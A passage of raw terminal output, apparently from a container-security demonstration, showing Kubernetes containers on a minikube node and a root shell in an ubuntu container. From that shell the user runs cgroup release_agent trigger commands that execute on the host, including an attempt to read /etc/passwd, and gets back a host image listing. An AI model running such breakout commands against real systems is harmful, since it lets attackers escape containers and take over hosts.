469ddf2f1b46        70f311871ae1           "/coredns -conf /etc…"   11 minutes ago      Up 11 minutes                           k8s_coredns_coredns-6955765f44-dxl5n_kube-system_a1d6e1bf-0f7a-48fe-9457-41ad8cdc3a6c_0
16d57b290912        4689081edb10           "/storage-provisioner"   11 minutes ago      Up 11 minutes                           k8s_storage-provisioner_storage-provisioner_kube-system_7292d629-86e0-45c9-800d-e281527cfa39_0
82ba80e77c2a        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11 minutes                           k8s_POD_storage-provisioner_kube-system_7292d629-86e0-45c9-800d-e281527cfa39_0
e9d16cce30d7        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11 minutes                           k8s_POD_kubernetes-dashboard-79d9cd965-9dzv6_kubernetes-dashboard_c2dce65e-ee37-4bd8-81a7-e590415589f9_0
1256cef3e9a4        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11 minutes                           k8s_POD_dashboard-metrics-scraper-7b64584c5c-dfmzg_kubernetes-dashboard_237485c1-7ddf-463b-9ab8-2fdbb82036ae_0
93ef80c3376f        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11 minutes                           k8s_POD_coredns-6955765f44-dxl5n_kube-system_a1d6e1bf-0f7a-48fe-9457-41ad8cdc3a6c_0
c0da0986fc3a        ae853e93800d           "/usr/local/bin/kube…"   11 minutes ago      Up 11 minutes                           k8s_kube-proxy_kube-proxy-pt8n2_kube-system_8cb86de3-d16b-4953-8199-50879d71e43a_0
4ad8b90846fd        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11 minutes                           k8s_POD_kube-proxy-pt8n2_kube-system_8cb86de3-d16b-4953-8199-50879d71e43a_0
75da07b0197a        303ce5db0e90           "etcd --advertise-cl…"   11 minutes ago      Up 11 minutes                           k8s_etcd_etcd-minikube_kube-system_79645f629a516339739668161bf8cdf4_0
eba8bf417daf        90d27391b780           "kube-apiserver --ad…"   11 minutes ago      Up 11 minutes                           k8s_kube-apiserver_kube-apiserver-minikube_kube-system_620391e64da4ef134ca8d5fda9dff78c_0
87a36545530a        b0f1517c1f4b           "kube-controller-man…"   11 minutes ago      Up 11 minutes                           k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_9a4c117280e4dc00b50f14fa58ce4d1f_0
629c30769aea        d109c0821a2b           "kube-scheduler --au…"   11 minutes ago      Up 11 minutes                           k8s_kube-scheduler_kube-scheduler-minikube_kube-system_e3025acd90e7465e66fa19c71b916366_0
23da52dc53eb        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11 minutes                           k8s_POD_etcd-minikube_kube-system_79645f629a516339739668161bf8cdf4_0
0f9a2ca4e89c        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11 minutes                           k8s_POD_kube-apiserver-minikube_kube-system_620391e64da4ef134ca8d5fda9dff78c_0
9a776da17711        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11 minutes                           k8s_POD_kube-scheduler-minikube_kube-system_e3025acd90e7465e66fa19c71b916366_0
132b213da208        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11 minutes                           k8s_POD_kube-controller-manager-minikube_kube-system_9a4c117280e4dc00b50f14fa58ce4d1f_0
b09ddb70b06b        ubuntu                 "bash"                   11 minutes ago      Up 11 minutes                           unruffled_satoshi
root@b09ddb70b06b:/# echo "docker images && cat /etc/passw > $host_path/output" >> /cmd
root@b09ddb70b06b:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b09ddb70b06b:/# cat output
root@b09ddb70b06b:/# echo "docker images > $host_path/output" >> /cmd
root@b09ddb70b06b:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b09ddb70b06b:/# cat output
REPOSITORY                                      TAG                 IMAGE ID            CREATED             SIZE
redis                                           latest              7eed8df88d3b        6 months ago        98.2MB
ubuntu                                          latest              72300a873c2c        6 months ago        64.2MB
k8s.gcr.io/kube-proxy                           v1.17.3             ae853e93800d        7 months ago        116MB
k8s.gcr.io/kube-apiserver                       v1.17.3             90d27391b780        7 months ago        171MB
k8s.gcr.io/kube-controller-manager              v1.17.3             b0f1517c1f4b        7 months ago        161MB
k8s.gcr.io/kube-scheduler                       v1.17.3             d109c0821a2b        7 months ago        94.4MB
alpine                                          latest              e7d92cdc71fe        7 months ago        5.59MB
kubernetesui/dashboard                          v2.0.0-beta8        eb51a3597525        9 months ago        90.8MB
k8s.gcr.io/coredns                              1.6.5               70f311871ae1        10 months ago       41.6MB
k8s.gcr.io/etcd                                 3.4.3-0             303ce5db0e90        10 months ago       288MB
kubernetesui/metrics-scraper                    v1.0.2              3b08661dc379        10 months ago       40.1MB
weaveworks/scope                                1.11.4              a082d48f0b39        13 months ago       78.5MB
quay.io/ansible/molecule                        2.20                1171569d6ba4        18 months ago       704MB
weaveworks/scope                                1.10.2              d9ece03f45e7        19 months ago       75.8MB
k8s.gcr.io/kube-addon-manager                   v9.0                119701e77cbc        20 months ago       83.1MB
k8s.gcr.io/kubernetes-dashboard-amd64           v1.10.1             f9aed6605b81        21 months ago       122MB
gcr.io/hello-minikube-zero-install/hello-node   latest              14f0c79cd094        22 months ago       655MB
gcr.io/kubernetes-helm/tiller                   v2.10.0             0cccc6576d01        2 years ago         68.9MB
k8s.gcr.io/heapster-amd64                       v1.5.3              f57c75cd7b0a        2 years ago         75.3MB
k8s.gcr.io/pause                                3.1                 da86e6ba6ca1        2 years ago         742kB
gcr.io/k8s-minikube/storage-provisioner         v1.8.1              4689081edb10        2 years ago         80.8MB
k8s.gcr.io/heapster-influxdb-amd64              v1.3.3              577260d221db        3 years ago         12.5MB
k8s.gcr.io/heapster-grafana-amd64               v4.4.3              8cb3de219af7        3 years ago         152MB
quay.io/munnerz/keepalived-cloud-provider       0.0.1               e099e9cd14a0        3 years ago         127MB
redis                                           3.0.7-alpine        856249f48b0c        3 years ago         12.6MB
gcr.io/google_containers/kube-keepalived-vip    0.9                 959a1b4b8b0f        3 years ago         142MB
jocatalin/kubernetes-bootcamp                   v2                  b6556396ebd4        4 years ago         211MB
jocatalin/kubernetes-bootcamp                   v1                  8fafd8af70e9        4 years ago         211MB
gcr.io/google-samples/kubernetes-bootcamp       v1                  8fafd8af70e9        4 years ago         211MB
gcr.io/google_containers/echoserver             1.4                 a90209bb39e3        4 years ago         140MB
gcr.io/google-samples/gb-frontend               v3                  c038466384ab        5 years ago         510MB
gcr.io/google_samples/gb-redisslave             v1                  5f026ddffa27        5 years ago         109MB
root@b09ddb70b06b:/#
```
